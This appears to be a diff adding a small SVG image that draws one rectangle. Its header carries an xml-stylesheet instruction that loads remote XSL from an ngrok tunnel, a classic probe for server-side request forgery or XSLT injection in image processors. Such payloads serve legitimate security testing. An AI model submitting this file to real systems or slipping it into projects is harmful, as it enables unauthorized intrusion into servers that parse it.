@@ -1,0 +1,6 @@
+<?xml version="1.0" ?>
+<?xml-stylesheet href="https://63f3d189.ngrok.io/style.xsl" type="text/xsl" ?>
+<svg width="10cm" height="5cm"
+     xmlns="http://www.w3.org/2000/svg">
+  <rect x="2cm" y="1cm" width="6cm" height="3cm"/>
+</svg>
